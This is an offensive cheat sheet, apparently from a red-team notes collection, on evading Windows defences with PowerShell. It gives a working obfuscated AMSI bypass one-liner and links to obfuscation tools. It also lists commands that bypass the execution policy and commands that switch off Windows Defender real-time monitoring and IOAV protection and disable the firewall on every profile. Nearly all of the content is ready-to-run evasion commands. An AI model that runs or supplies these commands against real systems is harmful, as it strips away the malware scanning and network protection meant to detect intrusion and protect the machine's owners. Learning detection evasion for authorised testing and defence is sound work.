# Evasion

## Powershell Detections
- System-Wide Transcript
- Script Block Logging
- Anti Malwate Scan Interface ( AMSI )
- Constrained Language Mode - Integrated with AppLocker and WDAC (Device Guard)

## AMSI Bypass
- Obfuscate with - https://github.com/danielbohannon/Invoke-Obfuscation
- https://amsi.fail
- https://github.com/aloksaurabh/OffenPowerSh/blob/master/Bypass/Invoke-AlokS-AvBypass.ps1
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Execution Policy
This is not a security feature. It is there to prevent users from accidentally executing scripts.
#### View the Execution Policy
```
Get-ExecutionPolicy
```
#### Bypass the Execution Policy
```
powershell –executionpolicy bypass .\script.ps1
powershell –c <cmd>
powershell –enc
powershell.exe -executionpolicy bypass
```

## Defence Evasion
#### Check the Running status of Windows Defender
```
Get-MpComputerStatus
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```

#### Disable AV Monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPReference -DisableIOAVProtection $true

powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
```

#### Disable Firewall
```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 

powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
```

